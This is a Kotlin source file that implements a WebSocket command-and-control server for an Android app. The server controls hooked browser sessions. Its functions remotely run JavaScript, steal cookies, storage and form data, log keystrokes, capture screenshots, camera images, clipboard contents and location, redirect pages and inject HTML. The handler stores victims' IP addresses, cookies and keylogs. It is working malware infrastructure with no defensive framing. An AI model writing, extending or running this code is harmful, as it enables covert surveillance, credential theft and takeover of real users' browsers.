package com.cyberghost.core

import android.util.Log
import io.netty.bootstrap.ServerBootstrap
import io.netty.channel.*
import io.netty.channel.nio.NioEventLoopGroup
import io.netty.channel.socket.SocketChannel
import io.netty.channel.socket.nio.NioServerSocketChannel
import io.netty.handler.codec.http.*
import io.netty.handler.codec.http.websocketx.*
import io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import org.json.JSONObject
import java.net.InetSocketAddress
import java.time.Instant
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap

data class C2Event(val sessionId: String, val type: String, val data: Map<String, Any?>, val timestamp: Instant = Instant.now())

class WebSocketC2Server(
    private val port: Int = 9091,
    private val deviceManager: DeviceManager
) {
    private var bossGroup: NioEventLoopGroup? = null
    private var workerGroup: NioEventLoopGroup? = null
    private val sessionChannels = ConcurrentHashMap<String, Channel>()
    private val _events = MutableSharedFlow<C2Event>(replay = 0, extraBufferCapacity = 512)
    val events: SharedFlow<C2Event> = _events

    fun start() {
        try {
            bossGroup = NioEventLoopGroup(1)
            workerGroup = NioEventLoopGroup(1)
            ServerBootstrap().group(bossGroup, workerGroup).channel(NioServerSocketChannel::class.java)
                .childHandler(object : ChannelInitializer<SocketChannel>() {
                    override fun initChannel(ch: SocketChannel) {
                        ch.pipeline().addLast(HttpServerCodec(), HttpObjectAggregator(65_536),
                            WebSocketServerProtocolHandler("/agent", null, true, 65_536),
                            C2Handler(this@WebSocketC2Server, deviceManager))
                    }
                }).bind(port).sync()
            Log.i("CG2", "C2 server started on port $port")
        } catch (e: Exception) {
            Log.e("CG2", "C2 server failed to start", e)
        }
    }

    fun stop() {
        try { bossGroup?.shutdownGracefully(); workerGroup?.shutdownGracefully() } catch (_: Exception) {}
        bossGroup = null; workerGroup = null; sessionChannels.clear()
    }

    fun registerChannel(sessionId: String, channel: Channel) { sessionChannels[sessionId] = channel }
    fun removeChannel(sessionId: String) { sessionChannels.remove(sessionId); deviceManager.markDisconnected(sessionId) }
    fun emitEvent(event: C2Event) { _events.tryEmit(event) }

    fun sendCommand(sessionId: String, action: String, params: Map<String, Any?> = emptyMap()): String? {
        val channel = sessionChannels[sessionId] ?: return null
        val cmdId = UUID.randomUUID().toString().take(8)
        try {
            val json = JSONObject().apply { put("action", action); put("id", cmdId); params.forEach { (k, v) -> put(k, v) } }
            channel.writeAndFlush(TextWebSocketFrame(json.toString()))
            deviceManager.recordCommand(sessionId, CommandRecord(id = cmdId, action = action, sentAt = Instant.now()))
        } catch (e: Exception) {
            Log.e("CG2", "Send command failed: $action", e)
            return null
        }
        return cmdId
    }

    fun execJs(sessionId: String, code: String) = sendCommand(sessionId, "exec_js", mapOf("code" to code))
    fun getCookies(sessionId: String) = sendCommand(sessionId, "get_cookies")
    fun getStorage(sessionId: String) = sendCommand(sessionId, "get_storage")
    fun getDom(sessionId: String) = sendCommand(sessionId, "get_dom")
    fun screenshot(sessionId: String) = sendCommand(sessionId, "screenshot")
    fun startKeylog(sessionId: String) = sendCommand(sessionId, "keylog_start")
    fun stopKeylog(sessionId: String) = sendCommand(sessionId, "keylog_stop")
    fun dumpKeylog(sessionId: String) = sendCommand(sessionId, "keylog_dump")
    fun redirect(sessionId: String, url: String) = sendCommand(sessionId, "redirect", mapOf("url" to url))
    fun injectHtml(sessionId: String, html: String) = sendCommand(sessionId, "inject_html", mapOf("html" to html))
    fun playAudio(sessionId: String, url: String, volume: Double = 1.0) = sendCommand(sessionId, "play_audio", mapOf("url" to url, "volume" to volume))
    fun playVideo(sessionId: String, url: String) = sendCommand(sessionId, "play_video", mapOf("url" to url))
    fun showDocument(sessionId: String, url: String) = sendCommand(sessionId, "show_document", mapOf("url" to url))
    fun getClipboard(sessionId: String) = sendCommand(sessionId, "get_clipboard")
    fun getLocation(sessionId: String) = sendCommand(sessionId, "get_location")
    fun cameraSnap(sessionId: String) = sendCommand(sessionId, "camera_snap")
    fun grabForms(sessionId: String) = sendCommand(sessionId, "form_grab")
    fun showAlert(sessionId: String, msg: String) = sendCommand(sessionId, "alert", mapOf("message" to msg))
}

class C2Handler(
    private val server: WebSocketC2Server,
    private val deviceManager: DeviceManager
) : SimpleChannelInboundHandler<TextWebSocketFrame>() {
    private var sessionId: String? = null

    override fun channelRead0(ctx: ChannelHandlerContext, frame: TextWebSocketFrame) {
        try {
            val json = JSONObject(frame.text())
            val type = json.optString("type", "")
            val session = json.optString("session", "")
            val data = json.optJSONObject("data")
            val clientIp = (ctx.channel().remoteAddress() as? InetSocketAddress)?.address?.hostAddress ?: "unknown"

            when (type) {
                "register" -> {
                    sessionId = session; server.registerChannel(session, ctx.channel())
                    val storageMap = mutableMapOf<String, String>()
                    data?.optJSONObject("localStorage")?.let { ls -> ls.keys().forEach { k -> storageMap[k] = ls.optString(k) } }
                    deviceManager.registerHook(ip = clientIp, sessionId = session, pageUrl = data?.optString("url") ?: "",
                        userAgent = data?.optString("userAgent") ?: "", platform = data?.optString("platform") ?: "",
                        screenSize = data?.optString("screen") ?: "", language = data?.optString("language") ?: "",
                        cookies = data?.optString("cookies") ?: "", localStorage = storageMap)
                    server.emitEvent(C2Event(session, "registered", mapOf("ip" to clientIp, "url" to (data?.optString("url") ?: ""))))
                }
                "keylog" -> {
                    val keys = mutableListOf<KeyEvent>()
                    data?.optJSONArray("keys")?.let { arr -> for (i in 0 until arr.length()) { val k = arr.getJSONObject(i); keys.add(KeyEvent(k.optString("key"), k.optString("code"), k.optString("target"), k.optLong("time"))) } }
                    deviceManager.appendKeylog(session, keys); server.emitEvent(C2Event(session, "keylog", mapOf("count" to keys.size)))
                }
                "exec_result" -> {
                    val cmdId = data?.optString("id") ?: ""
                    deviceManager.updateCommandResult(session, cmdId, result = data?.optString("result"), error = data?.optString("error"))
                    server.emitEvent(C2Event(session, "exec_result", mapOf("id" to cmdId, "result" to data?.optString("result"))))
                }
                "screenshot", "camera" -> server.emitEvent(C2Event(session, type, mapOf("image" to data?.optString("image"), "error" to data?.optString("error"))))
                "cookies", "storage", "dom", "clipboard", "location", "forms", "navigate" -> {
                    val eventData = mutableMapOf<String, Any?>(); data?.keys()?.forEach { k -> eventData[k] = data.opt(k) }
                    server.emitEvent(C2Event(session, type, eventData))
                }
                "pong" -> deviceManager.getSession(session)?.lastPing = Instant.now()
                "ack" -> server.emitEvent(C2Event(session, "ack", mapOf("action" to data?.optString("action"))))
            }
        } catch (e: Exception) {
            Log.e("CG2", "C2 handler error", e)
        }
    }

    override fun channelInactive(ctx: ChannelHandlerContext) { sessionId?.let { server.removeChannel(it) }; super.channelInactive(ctx) }
    override fun exceptionCaught(ctx: ChannelHandlerContext, cause: Throwable) {
        Log.e("CG2", "C2 exception", cause)
        sessionId?.let { server.removeChannel(it) }; ctx.close()
    }
}
